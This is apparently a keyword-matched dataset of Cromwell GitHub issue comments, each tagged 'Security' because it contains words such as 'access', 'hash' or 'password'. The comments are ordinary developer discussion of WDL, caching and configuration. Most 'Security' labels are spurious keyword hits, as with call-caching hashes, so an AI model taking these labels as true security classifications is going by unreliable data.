Security,"Hey @aednichols, I tested this to make sure, and as expected, running the test with `version 1.0` fails with errors:. ```; Failed to read task definition at line 3 column 6 (reason 1 of 1): Failed to read outputs section (reason 1 of 1): Failed to read declaration (reason 1 of 1): Failed to parse expression (reason 1 of 1): Unknown engine function: 'sep'; Failed to read task definition at line 13 column 6 (reason 1 of 1): Failed to parse expression (reason 1 of 1): Unknown engine function: 'sep'; ```. I've fixed the corresponding tests in https://github.com/broadinstitute/cromwell/pull/5494/commits/40851b7423de68bda7ff9aaa47a37fbf7a0a70a3. So this should still be good to merge!. Edit: I see the test is failing, but looks like an unrelated error:. ```; [error] java.lang.RuntimeException: The vault token file ""/home/travis/.vault-token"" does not exist. Be sure to login using the instructions on https://hub.docker.com/r/broadinstitute/dsde-toolbox/ under ""Authenticating to vault"".; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5494#issuecomment-654019247:967,Authenticat,Authenticating,967,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5494#issuecomment-654019247,1,['Authenticat'],['Authenticating']
Security,"Hey @benjamincarlin,. The call caching feature is really designed with the focus on not having to recomputing outputs. In the case of the monitoring script, it really was meant to be treated as a debugging tool and not a true output from a task. Can you explain why you need to the monitoring log for cached jobs, especially as its not new information? Is the motivation to be able to access all monitoring logs under one workflow uuid directory?. Thanks!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4330#issuecomment-444621805:385,access,access,385,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4330#issuecomment-444621805,1,['access'],['access']
Security,"Hey @cmarkello, unrelated to your initial problem, but how do you find the performance of the file-hash based caching for Cromwell? We've found it to be incredibly CPU / memory / network intensive for large (~250GB) input files so looking for alternatives (#5346).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5405#issuecomment-583216806:99,hash,hash,99,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5405#issuecomment-583216806,1,['hash'],['hash']
Security,"Hey @gauravs90 - this looks like it shares a bit of work with the stuff I did in my #707 PR, trying to get message processing as far through the system as possible without backends. Luckily, you've focused in a different place (the actual validation) so combining/merging them shouldn't be too tough. The big differences I can see:; - I did the Materialization in a shadow actor to avoid interrupting the main one; - I moved backend assignment into my ShadowMaterializeWorkflowDescriptorActor; - MaterializeWorkflowDescriptorActor creates a data-only EngineWorkflowDescriptor. Literally just a BackendWorkflowDescriptor plus backend assignments. Having looked at your code though, I'm now unsure which is better; - It turned out I wasn't 100% correct first time so there was a lot of tidying up in the interfaces between the lifecycle states :-/ . Anyway, I've added you as a reviewer on my PR so you can have a look at what I've done - it'd be nice to try to work out where these things should go and maybe rebase or merge these PRs since they're making changes in similar places?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/709#issuecomment-210438658:239,validat,validation,239,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/709#issuecomment-210438658,1,['validat'],['validation']
Security,"Hey @jsotobroad sorry if this is a well-known issue but I've been OOO for a couple of days, but why would these changes be made relative to a particular hash and not off develop?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/587#issuecomment-198466801:153,hash,hash,153,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/587#issuecomment-198466801,1,['hash'],['hash']
Security,"Hey @leepc12 it turns out that you do have a bug in your WDL and that Cromwell 29 was at fault for not highlighting it too. I'll submit a PR to include a better error message, which will be along the lines of:; ```; Unable to build WOM node for If '$if_2': Unable to build WOM node for Scatter '$scatter_2': Unable to build WOM node for WdlTaskCall 't3': Invalid indexing target. You cannot index a value of type'Array[Int]?'; ```. Notice that in order to access `t2.out` you're looking up inside another `if` block, which means that the output has to be treated as optional. . - Given the structure of *this* workflow you could move the `if ( b1 && b2 )` inside the `if (b1)` (and simplify the conditional expression). ; - If that's not possible in your real workflow you can use `select_first` to get the value out, eg `call t0 as t3 { input: i=select_first([t2.out])[i] }` (NB this is only valid because `if (b1 && b2)` implies `if (b1)` must have been run, so the `select_first` is known to succeed)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3007#issuecomment-349689182:456,access,access,456,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3007#issuecomment-349689182,2,['access'],['access']
Security,"Hey @rhpvorderman, I've started to use this for our workflows and seems to be working well! Props for this change :). I've got a small suggestion (not enough to raise an issue, and only if you're already making other changes), it would be awesome if Cromwell could log a message to say that it's copying files. I watch for that because then I know the task is starting properly. . Unrelated to that, I was wondering what hurdles might have to be overcome to devise a hashing-strategy based on your new `cached-copy` (that's not File / md5). You've mentioned [before](https://github.com/broadinstitute/cromwell/issues/2620#issuecomment-482565332) that this might be possible as it doesn't depend on the final path.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4900#issuecomment-507916924:467,hash,hashing-strategy,467,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4900#issuecomment-507916924,1,['hash'],['hashing-strategy']
Security,"Hey everyone, I did manage to do some testing today (after some discussion with @TMiguelT as well). Some small notes about my setup:. - I'm using Singularity that has the ability to store and run an OCI container to/from a file.; - I have one place `/path/to/containers/*` where I store all my containers.; - I transform the container digest (returned by Cromwell as `${docker}`) to generate a filename and use that to uniquely reference the container (per this PR: #4797). Notes about my (slightly modified) config below:. - My `$image` var has slashes in it (because it's a path to a file) which isn't correct, as `flock` expects a valid path, so I've just used `$docker_subbed` which is the transformed docker file.; - I didn't have write permission to `/var/lock/$imagename`, I've opted instead for the container directory.; - I wanted the output of `flock` to be redirected to Cromwell's `stderr.submit`.; - I do the second image check for when the lock is released, the locked processes will find the image and skip the pull (per @rherban's [comment](https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-509677104)); ```bash; # transformed docker digest; docker_subbed=$(sed -e 's/[^A-Za-z0-9._-]/_/g' <<< ${docker}); # output path of container (.sif); image=/path/to/containers/$docker_subbed.sif; # declare a very similar path (.lock) where Cromwell can access; lockpath=/path/to/containers/$docker_subbed.lock . if [ ! -f ""$image"" ]; then # If we already have the image, skip everything; (; flock --verbose --exclusive 200 1>&2; if [ ! -f ""$image"" ]; then # do a second check once the lock has been released ; singularity pull ""$image"" docker://${docker}; fi; ) 200>/var/lock/$lockpath; fi; ```. Hope this helps!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-517123637:1377,access,access,1377,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-517123637,1,['access'],['access']
Security,"Hi , ; When submitting jobs requiring GPU, we specified in the runtime session: ; gpuCount: 2; gpuType: ""nvidia-tesla-k80""; the jobs failed with following errors:; 2019/05/03 14:40:50 E: command failed: nvidia-docker | 2019/05/03 14:40:50 Error: Could not load UVM kernel module. Is nvidia-modprobe installed?. The same WDL file (with same docker and runtime attributes) used to work before. Please help!. Thanks!. <!--; Hi! Thanks for taking the time to report feedback. Before posting an issue here, please check whether your question is already answered in our:; forum https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; documentation http://cromwell.readthedocs.io/en/develop/. Other forums:; FireCloud https://gatkforums.broadinstitute.org/firecloud/categories/ask-the-firecloud-team; WDL https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; CWL https://www.biostars.org/; -->. <!-- Are you seeing something that looks like a bug? Then great! You're in the right place. -->. <!-- Which backend are you running? -->. <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4935:1169,PASSWORD,PASSWORDS,1169,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4935,1,['PASSWORD'],['PASSWORDS']
Security,"Hi -- I know this is an old issue, but has there been any further discussion on how to mount persistent disks? We're using PAPIv2 as the backend, and we'd like to expose reference databases (stored as filesystems) to our docker containers via a mounted volume.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2190#issuecomment-477680950:163,expose,expose,163,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2190#issuecomment-477680950,1,['expose'],['expose']
Security,"Hi @AlekseiLitkovetc,. > I would like to know which two tests should pass with non-default credentials. Back in March when I filed the ticket we were only [including tests for four](https://github.com/broadinstitute/cromwell/blob/38/src/ci/bin/testCentaurAws.sh#L24-L27) of our dozens of Centaur tests. After the AWS hackathon, the test coverage expanded to only [exclude a few](https://github.com/broadinstitute/cromwell/blob/39/src/ci/bin/testCentaurAws.sh#L25-L53) remaining tests. So, the original minimum A/C was to see these tests passing with non-default creds:; - [hello](https://github.com/broadinstitute/cromwell/blob/42/centaur/src/main/resources/standardTestCases/hello.test); - [long_cmd](https://github.com/broadinstitute/cromwell/blob/42/centaur/src/main/resources/standardTestCases/long_cmd.test); - [haplotypecaller.aws](https://github.com/broadinstitute/cromwell/blob/42/centaur/src/main/resources/integrationTestCases/haplotypecaller.aws.test); - [singlesample.aws](https://github.com/broadinstitute/cromwell/blob/42/centaur/src/main/resources/integrationTestCases/singlesample.aws.test). > could you please prompt where I can find a link to Jenkins?. Our Jenkins servers are only internally accessible to Broad employees because of Jenkins continued problems with security. Perhaps one day we'll move off Travis to another public CI-as-a-Service that will run tests longer than 180 minutes, such as CircleCI or Google Cloud Build. Then we could migrate all tests to one place.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4740#issuecomment-503831164:1211,access,accessible,1211,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4740#issuecomment-503831164,2,"['access', 'secur']","['accessible', 'security']"
Security,"Hi @Redmar-van-den-Berg, you're correct, there appears to be a bug in our draft-2 parser which is failing to catch this. To answer ""which is correct"", the requirement to wrap values in arrays was not being enforced correctly but it now is. In your example you can do this with the array literal syntax, eg:; ```wdl; call ls {; input: files = [ i ]; }; ```. I have added a test for our WDL 1.0 support which **is** catching this properly, so if you're able to upgrade your workflows from WDL draft-2 to WDL 1.0, then `womtool validate` will give you the correct answer. If not, I'll leave this open as a bug since it certainly *should* be picked up by womtool. Thanks!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4550#issuecomment-454545219:525,validat,validate,525,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4550#issuecomment-454545219,1,['validat'],['validate']
Security,"Hi @TMiguelT, I worked on relative imports in Cromwell quite recently. The ideas about specifying the ""start point"" within the zip file did come up, but in the end people seemed more interested in relative HTTP imports (which is what I focussed on). I have two potential ideas for you which hopefully don't need Cromwell code changes. Hopefully these will help you - if not let us know!. ## Submit by URL. If you have a new version of Cromwell - since these changes were relatively recent - then you could try submitting the workflow to Cromwell by URL (based on your relative path, I'd guess the github hosted location you want would be https://raw.githubusercontent.com/h3abionet/h3agatk/1.0.1/workflows/GATK/GATK-complete-WES-Workflow-h3abionet.cwl). ## Call into the relatively nested file. If submit by URL is out, you could perhaps make a top level ""wrapper"" workflow which immediately imports and calls `workflows/GATK/GATK-complete-WES-Workflow-h3abionet.cwl`. This should let you access it while keeping it's location relative to the other files in the repo safe",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4505#issuecomment-449025212:989,access,access,989,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4505#issuecomment-449025212,1,['access'],['access']
Security,"Hi @cjllanwarne, thanks for the response! Actually, my examples passed validation by `wdltool`, but I justed tested them with the current version of `womtool` and they did not pass the validation, and the errors are meaningful. I think it's safe to dismiss the bug label now.; ```Unable to build WOM node for Scatter '$scatter_0': Unable to build WOM node for WdlTaskCall 'testtask': Cannot build expression for 'Test_optional.testtask.str = strings1[idx]': Invalid indexing target. You cannot index a value of type 'Array[String]?'```. ```Unable to build WOM node for Declaration 'num': Cannot build expression for 'Test_optional.num = length(strings1)': Unexpected arguments to function `length`. `length` takes a parameter of type Array but got: Success(WomOptionalType(WomMaybeEmptyArrayType(WomStringType)))```. ```Unable to build WOM node for Declaration 'string_pair': Cannot build expression for 'Test_optional.string_pair = zip(strings1, strings2)': Unexpected zip parameters: Vector(Success(WomOptionalType(WomMaybeEmptyArrayType(WomStringType))), Success(WomOptionalType(WomMaybeEmptyArrayType(WomStringType))))```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4218#issuecomment-428632555:71,validat,validation,71,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4218#issuecomment-428632555,2,['validat'],['validation']
Security,"Hi @cjllanwarne.; Yes, you correctly understood the problem. We haven't tried this option, because we were fixated on one approach :); In general, your idea should solve the problem. Although I have a suspicion that an AccessDeniedException may be thrown there too. Anyway, I will try to do so and tell you the result.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4586#issuecomment-509830998:219,Access,AccessDeniedException,219,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4586#issuecomment-509830998,1,['Access'],['AccessDeniedException']
Security,"Hi @cpavanrun , thanks for the contribution!. Are you using docker? Not having write permission would mean files could only be removed via root access, as docker is executing these services as root. As such, I think this should be `733`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3721#issuecomment-394391389:144,access,access,144,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3721#issuecomment-394391389,1,['access'],['access']
Security,"Hi @dtenenba , we fully appreciate the importance of call caching and are looking into this. can I confirm a few things:. * that this is occurring on different files each run?; * you are seeing it every run of non-trivial size; * You have experienced at least one call-cache success run of any workflow (including a trivial one). This will help me narrow down what is going on. . To be clear, this should be working and we are aware that hashing is not a manual process but a simple value lookup.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4563#issuecomment-457307894:438,hash,hashing,438,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4563#issuecomment-457307894,2,['hash'],['hashing']
Security,"Hi @geoffjentry - ; The changes that I pushed are related to the test of the `validateRunArguments` method. Since I changed him, I had to change the tests. I did not notice this test initially.; This bothers me a bit because I did not expect the behavior of the method to change when processing WDL files. But in the end, now this method just processes the files in the same way as in server mode. Moreover, maybe the new behavior makes sense. For example, `validation.get.workflowUrl` indeed should be `None`, since we are supplying workflow without any `url`.; Just in case, I ran simple WDL workflows and didn't encounter any issue.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5104#issuecomment-519103366:78,validat,validateRunArguments,78,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5104#issuecomment-519103366,4,['validat'],"['validateRunArguments', 'validation']"
Security,"Hi @kaushik-work - internally Cromwell access docker APIs directly and is not shelling out to `docker` for a variety of reasons. Our experience has been that various container registries have needed to be individually supported as things like auth differ, and there are sometimes subtle differences between the sites. It'd likely not be much work to provide a generic catch all which would work for most sites on public images. However this isn't a common request so prioritizing that over more frequent requests is difficult. However, if what you're getting at is that SBG is now supporting WDL (or is planning on doing so), presumably we'd start seeing more uses of SBG's container registry showing up in WDLs we see in the wild.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4098#issuecomment-422223991:39,access,access,39,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4098#issuecomment-422223991,1,['access'],['access']
Security,"Hi @kcibul it's about consolidating all of our various devops-y things into a more unified manner. Ideally we'd like to have the Push To DockerHub wrapped into our Jenkins. @hjfbynara can explain more, but from a strategic point, unifying how we move our Dockers around is a good thing, particularly for security and accountability. You can all meet but we're trying to make our DevOps work more unified. Please find me for this meeting.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1654#issuecomment-259459453:304,secur,security,304,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1654#issuecomment-259459453,1,['secur'],['security']
Security,"Hi @kshakir, ; Inadvertently did merge instead of rebase. Hope it's ok.; When building pull request, one of the jobs failed first: https://api.travis-ci.com/v3/job/480472697/log.txt. Tried rerunning. It passed.; Would it be possible to share the internal failed test, I would like to run it locally in my workspace if possible. I can't access the failed test discussions link in your reply.; Thanks much.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6157#issuecomment-774215286:336,access,access,336,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6157#issuecomment-774215286,1,['access'],['access']
Security,"Hi @nh13, not from Broad but have you tried turning the [docker-digest lookup off](https://cromwell.readthedocs.io/en/stable/tutorials/Containers/#docker-digests) with the following in your config:. ```; docker.hash-lookup.enabled = false; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5178#issuecomment-541952762:211,hash,hash-lookup,211,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5178#issuecomment-541952762,1,['hash'],['hash-lookup']
Security,"Hi @ruchim !. 1. Do you see anything in your logs that indicate db errors?. No. I see that the SGE job completed (`Status change from Running to Done`). 2. What does your db config look like?; ```; database {; db.url = ""jdbc:mysql://.../${CROMWELL_DB}?useSSL=false&rewriteBatchedStatements=true""; db.user = ...; db.password = ...; db.driver = ""com.mysql.jdbc.Driver""; profile = ""slick.jdbc.MySQLProfile$""; }; ```; backed by a MariaDB instance. 3. When you report the REST endpoint shows the workflow as 'Running', what about the executionStatus key in the metadata? Are some jobs marked as 'Running' as well?. The SGE job reported as running as well. I manually query the database, and I see no changes in the `JOB_STORE_ENTRY` table when the SGE job completes and the corresponding entry appears in the Cromwell logs (although not entirely sure I should see something). 4. Do you see this behavior only with large scatters (10K) or do you see it with smaller scatters as well? Or any other type of workflow shape?. I've only observed this behaviour with large scatters AND a file-of-file-names approach. I don't know exactly what combination of WDL features or what threshold of scatter width triggers it .",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3483#issuecomment-445788979:315,password,password,315,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3483#issuecomment-445788979,1,['password'],['password']
Security,"Hi @ruchim ,; Thanks for asking.; For example, normally, in the alignment, we need to provide the big fasta files as input.; So, it will download from s3 for each single job.; We have all the reference files in our EFS. For our own usage, we mount the EFS into every job definition. So the batch job can access the EFS directly. They don't need to download every time from S3.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4579#issuecomment-493492027:304,access,access,304,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4579#issuecomment-493492027,1,['access'],['access']
Security,"Hi @ruchim!. Regarding our current test setup:; We (Brian O., Alex B. and I) are currently using a very minimal test configuration:. Workflow:; GA4GH md5sum from Dockstore; https://dockstore.org/workflows/github.com/briandoconnor/dockstore-workflow-md5sum/dockstore-wdl-workflow-md5sum:1.4.0. Single File:; Source: UChicago Gen3 Data STAGE crai file; DRS URL: dos://dg.4503/2132c569-06e7-474c-8806-93aa116c5d1c; Size: 1.49mb. I just now ran this test configuration from scratch, starting with a new workspace, and it failed like all the others have:. Error:; ```; Task ga4ghMd5.md5:NA:1 failed. The job was stopped before the command finished. PAPI error code 10. The assigned worker has failed to complete the operation	; ```. Log:; ```; 2019/07/16 20:23:02 Starting container setup.; 2019/07/16 20:23:10 Done container setup.; 2019/07/16 20:23:16 Starting localization.; 2019/07/16 20:23:22 Localizing input dos://dg.4503/2132c569-06e7-474c-8806-93aa116c5d1c -> /cromwell_root/topmed-irc-share/genomes/NWD844894.b38.irc.v1.cram.crai; Compiling (synthetic)/ammonite/predef/interpBridge.sc; ```. The name of this workspace is `mbaumann test md5sum 20190716` and I have shared it with you as Owner, in case you would like to investigate. Regarding successful runs in Commons in 2018:; The last reported success that I am aware of was by Moran Cabi ali (then Broad) in mid-2018, when she did demos of obtaining data from UChicago (Windmill) and UCSC (Boardwalk).; I didn't actually run the workflow myself.; There are still some of the demo workspaces from that time available in Terra, which I can access yet don't have permission to share. I don't know if you can access them or not. One such workspace is:; `Team Calcium July 1 Demo - Boardwalk-Windmill_WS`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5069#issuecomment-511990334:1597,access,access,1597,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5069#issuecomment-511990334,2,['access'],['access']
Security,Hi @vsoch - I'm not sure quite what you're looking for here. There's the [WDL spec](https://github.com/openwdl/wdl/blob/master/versions/1.0/SPEC.md) and one can access programatically generated parsers in [multiple languages](https://github.com/openwdl/wdl/tree/master/versions/1.0/parsers) but at the moment the only option I know of which provide programatic **access** to WDL constructs is [miniwdl](https://github.com/chanzuckerberg/miniwdl) although it's still early days (however I'm sure they'd love support & ideas!). There's the WOM layer which we have in Scala and is what we use to internally generalize both WDL & Cromwell but it's likely not useful for your purposes as you can't directly input WOM. Although if what you're asking is if you were to take a WDL or CWL and export e.g. the WOM graph file you can do that with [womtool](https://cromwell.readthedocs.io/en/develop/WOMtool/). Let me know if this comes even close to answering your question :),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4339#issuecomment-442231730:161,access,access,161,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4339#issuecomment-442231730,2,['access'],['access']
Security,"Hi All, just checking in on this issue, to see if it is still alive. Would love to see ecr supported for hash-lookup.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4171#issuecomment-1332235511:105,hash,hash-lookup,105,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4171#issuecomment-1332235511,1,['hash'],['hash-lookup']
Security,"Hi All,; This PR is intended to review the implementation to perform ""runtime attributes"" validation in the backend side. Please, feel free to add any comment/idea that can add value to this.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/708:90,validat,validation,90,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/708,1,['validat'],['validation']
Security,"Hi Atlas Team,. . I have installed the Atlas(apache-atlas-sources-2.1.0) in; our server by following in the link; ""https://atlas.apache.org/2.0.0/InstallationSteps.html. After all the setup; have been done, we ran the atlas-start.py and the atlas is running on port; 21000.When we are accessing the atlas, we are facing 503 Service Unavailable; Error. We checked the logs from application.log file. We got below issue . . 2020-12-13 06:29:02,309 WARN - [main:] ~ JMX is not enabled to receive; remote connections. Please see cassandra-env.sh for more info.; (CassandraDaemon:81). 2020-12-13 06:29:02,310 ERROR - [main:] ~ cassandra.jmx.local.port missing; from cassandra-env.sh, unable to start local JMX service.null; (CassandraDaemon:87). . We see there is no ""cassandra-env.sh"" file in atlas and we; tried other ways and didn't find any solution for the above error. . Could you please help us in rectify these problem so that it; will be very helpful to us.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6133:285,access,accessing,285,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6133,1,['access'],['accessing']
Security,"Hi ChenYong,. I'm closing this issue here on GitHub as Cromwell [30-16f3632 / 30.2](https://github.com/broadinstitute/cromwell/releases/tag/30.2) seems to run fine against a basic MariaDB 5.5.56. I also tried changing the database initialization script to run with-and-without setting `SET GLOBAL sql_mode = 'ANSI_QUOTES';`. If you're still running into problems, can you please create a post over in the [Ask the WDL team](https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team) forum? There please provide as many logs and configuration files as possible (without passwords) so that your issue may be reproduced. ---. To test Cromwell with MariaDB I combined the following files and ran them from an `issues_3346/` directory with `docker-compose up`. - `issues_3346/compose/cromwell/app-config/application.conf`; - `issues_3346/compose/cromwell/Dockerfile`; - `issues_3346/compose/mysql/init/init_user.sql`; - `issues_3346/docker-compose.yml`. The files are in this archive: [issues_3346.tar.gz](https://github.com/broadinstitute/cromwell/files/2190721/issues_3346.tar.gz). Cromwell started and connected to the db. I was able to browse to `http://localhost:80` and submit a workflow.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3346#issuecomment-404688457:581,password,passwords,581,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3346#issuecomment-404688457,1,['password'],['passwords']
Security,"Hi Kristian,. I understand, but what you're asking is very possible - see my previous discussion here about creating 1 billion simultaneous connections, and anything that is not accessible can be pre-cached via buckets during idle periods (i.e. nightly):. https://github.com/googlegenomics/utils-java/issues/62#issuecomment-220444203. So you should be able to create your own Pipeline implementation very easily via `gloud create`, [VM metadata startup scripts](https://cloud.google.com/deployment-manager/step-by-step-guide/setting-metadata-and-startup-scripts) and/or Dataflow Pipelines, and mimic JES:. https://cloud.google.com/sdk/gcloud/reference/compute/instances/create. https://cloud.google.com/deployment-manager/step-by-step-guide/setting-metadata-and-startup-scripts. https://cloud.google.com/dataflow/pipelines/constructing-your-pipeline#applying-transforms-to-process-pipeline-data. If you look at the JES API, you'll notice most of it mirrors the `gcloud` commands and parameters:. https://www.googleapis.com/discovery/v1/apis/genomics/v1alpha2/rest. Again the concepts to speed up searches on dynamically streaming (processed) analysis results has a foundation via inverted indices, which search engines use all the time - I posted a couple of these here:. https://github.com/ga4gh/schemas/pull/253#issuecomment-97525342. https://github.com/ga4gh/schemas/issues/142#issuecomment-55518571. This way your searches are always fresh and would operate without any delay. Hope it helps,; Paul",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1058#issuecomment-228175605:178,access,accessible,178,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1058#issuecomment-228175605,2,['access'],['accessible']
Security,"Hi Sergey,. Most of our Travis builds short-circuit for external contributions due to security issues; the `space` test is still around but Travis does not run it against your fork. . [This](https://github.com/broadinstitute/cromwell/blob/develop/centaur/src/main/resources/standardTestCases/space/space.wdl) is the `space` WDL which you could try running against your changes. The workflow should succeed and have outputs that look like [these metadata expectations](https://github.com/broadinstitute/cromwell/blob/develop/centaur/src/main/resources/standardTestCases/space.test) in the `.test` file. Please let us know if you have any questions. Thanks!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5110#issuecomment-558350731:86,secur,security,86,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5110#issuecomment-558350731,1,['secur'],['security']
Security,"Hi Want to run my pipeline in gcp with nvidia-tesla-a100. Get errors for insert machine. Trake into the code since cromwell set n2-custom machine meanwhile a100 require a2-highgpu-1g. I guess it is not a big change but can extend capbilities. runtime {bootDiskSizeGb: 100; disks: ""/mnt 3000 HDD""; gpuType: ""nvidia-tesla-a100""; gpuCount: 1; nvidiaDriverVersion: ""418.87.00""; zones: [""us-central1-c""]; } (edited) . ###; ### IMPORTANT: Please file new issues over in our Jira issue tracker!; ###; ### https://broadworkbench.atlassian.net/projects/BA/issues; ###; ### You may need to create an account before you can view/create issues.; ###. <!--; Hi! Thanks for taking the time to report feedback. Before posting an issue over in Jira tracker, please check whether your question is already answered in our:; forum https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; documentation http://cromwell.readthedocs.io/en/develop/. Other forums:; FireCloud https://gatkforums.broadinstitute.org/firecloud/categories/ask-the-firecloud-team; WDL https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; CWL https://www.biostars.org/; -->. <!-- Are you seeing something that looks like a bug? Then great! You're almost in the right place. -->. <!-- You'll want to go to https://broadworkbench.atlassian.net/projects/BA/issues and then tell us: -->. <!-- Which backend are you running? -->. <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6558:1521,PASSWORD,PASSWORDS,1521,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6558,1,['PASSWORD'],['PASSWORDS']
